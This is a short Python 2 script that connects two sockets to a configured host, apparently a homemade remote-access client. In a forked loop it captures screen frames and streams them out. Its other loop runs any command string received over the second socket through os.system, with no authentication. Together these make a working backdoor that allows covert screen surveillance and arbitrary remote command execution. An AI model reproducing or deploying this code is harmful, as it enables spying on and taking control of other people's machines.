import socket
from ScreenCastFeed import ScreenCastFeed
import os

TCP_IP = '127.0.0.1'
#TCP_IP = '192.168.43.33'
TCP_PORT = 5005
MESSAGE = "Hello, World!"

TCP_PORT_2 = 9651

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s1.connect((TCP_IP, TCP_PORT_2))

sc = ScreenCastFeed("test")
pid = os.fork()
if pid!=0:
    while 1:
        arr = sc.get_frame()

        totalsent = 0
        metasent = 0
        length =len(arr)
        lengthstr=str(length).zfill(8)

        while metasent < 8 :
            sent = s.send(lengthstr[metasent:])
            if sent == 0:
                raise RuntimeError("Socket connection broken")
            metasent += sent


        while totalsent < length :
            sent = s.send(arr[totalsent:])
            if sent == 0:
                raise RuntimeError("Socket connection broken")
            totalsent += sent
else:
    exc = ""
    while True:
        
        chara = s1.recv(1)
        
        if (chara == '0'):
            os.system(exc)
            exc = ""
        else:
            exc = exc + chara
        print exc

s.close()
s1.close()